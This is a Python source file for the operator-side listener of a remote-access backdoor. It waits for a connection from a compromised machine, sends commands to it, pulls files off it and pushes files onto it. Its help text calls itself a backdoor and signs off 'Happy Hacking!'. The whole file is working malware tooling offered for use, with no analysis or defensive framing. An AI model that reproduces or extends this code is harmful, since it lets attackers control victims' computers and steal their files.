#!/usr/bin/python3
import socket, json, sys, os, re, base64, shutil

class Listener:
    try:
        def __init__(self, ip, port):
            listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) ##Enable an option to reuse sockets to reestablish connection in case of connection loss
            listener.bind((str(ip), port))
            listener.listen(0)
            print("[+] Standing by for incoming connections")
            print("[!] While you wait, please run \"help\" after getting the connection in order to understand the usage of this backdoor, if your are using it for the first time!")
            self.connection, self.address = listener.accept()
            print(f"[+] connection recieved from {str(self.address)}!")
    except KeyboardInterrupt:
        print("[-] Ctrl+C recieved! Closing listener!\n\n")
        sys.exit()


    def print_help(self):
        help_msg = "[+]\'download\' \t allows you to download files from client \t usage: download (filename) [!] PLEASE ENSURE YOU TYPE THE CORRECT FILE NAME AND IF IT CONTAINS SPACES, DO NOT PUT THE FILE NAME IN QUOTES!\n\'[+] upload\' \t allows you to upload files to client \t usage: upload (filename) [!] PLEASE ENSURE YOU TYPE THE CORRECT FILE NAME AND THAT IT DOES NOT CONTAIN SPACES! DO NOT PUT FILE NAME IN QUOTES!\n\'[+] exit\' \t closes connection to client \t usage: exit [!] PLEASE DO NOT ADD ADDITIONAL ARGUMENTS!\n\'cd\' \t gets current working directory on remote host \t usage: cd [!] PLEASE DO NOT ADD ADDITIONAL ARGUMENTS!\n\'cd (directory name)\' \t changes current working directory on remote host \t usage: cd (directory name) [!] IF TARGET DIRECTORY HAS SPACES, ENCLOSE IT IN QUOTES!\n[!] Please use this backdoor responsibly and well!\n[+] Happy Hacking!"
        return help_msg

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(str.encode(json_data))

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('UTF-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def change_working_directory(self, path):
        return f"[+]changing working directory to {path}\n\n"


    def write_file(self, path, content):
        with open(path, "wb") as file:
            try:
                base64.b64decode(file.write(content))
                return f"[+] download successful. downloaded to: {path}!"
            except TypeError:
                content = base64.b64decode(content)
                file.write(content)
                return f"[+] download successful. downloaded to: {path}!"

    def read_file(self, path):
        try:
            with open(str(path), "rb") as file:
                return base64.b64encode(file.read())
        except FileNotFoundError:
            return "[-] Not a valid file name/ file path!"

    def exec_remote_command(self, rawCommand):
        command = rawCommand
        if '\"' in command:
            second_arg = re.search('\".*\"', command)
            new_rawCommand = rawCommand.split(" ")
            command = [new_rawCommand[0], second_arg.group(0)]
        else:
            command = command.split(" ")

        if command[0] == 'exit' or command[0] == 'Exit':
            self.connection.close()
            exit()

        elif (command[0] == 'cd' or command[0] == 'chdir') and len(command) > 1:
            print(self.change_working_directory(command[1]))

        elif command[0] == "upload" or command[0] == "Upload":
            if len(command) > 1:
                file_content = self.read_file(command[1])
                command.append(file_content.decode())
            else:
                return("[-] No file to upload specified! Please ensure filename does not have spaces!")
        self.reliable_send(command)
        return self.reliable_recv()


    def run(self):
        try:
            while True:
                rawCommand = input("\ncommand>> ")
                command_check = rawCommand.split(" ")
                result = self.exec_remote_command(rawCommand)
                if command_check[0] == "download" or command_check[0] == "Download":
                    raw_file_name = command_check
                    del raw_file_name[0]
                    file_name = " ".join(raw_file_name)
                    result = self.write_file(file_name, result)

                elif command_check[0] == "help" or command_check[0] == "Help":
                    result = self.print_help()
                print(result)
        except ConnectionResetError:
            print("\n[-] Can't connect to client!\n")

        except KeyboardInterrupt:
            print("[-] Ctrl+C recieved! Closing connection to remote client!\n\n")
            self.connection.close()
            exit()
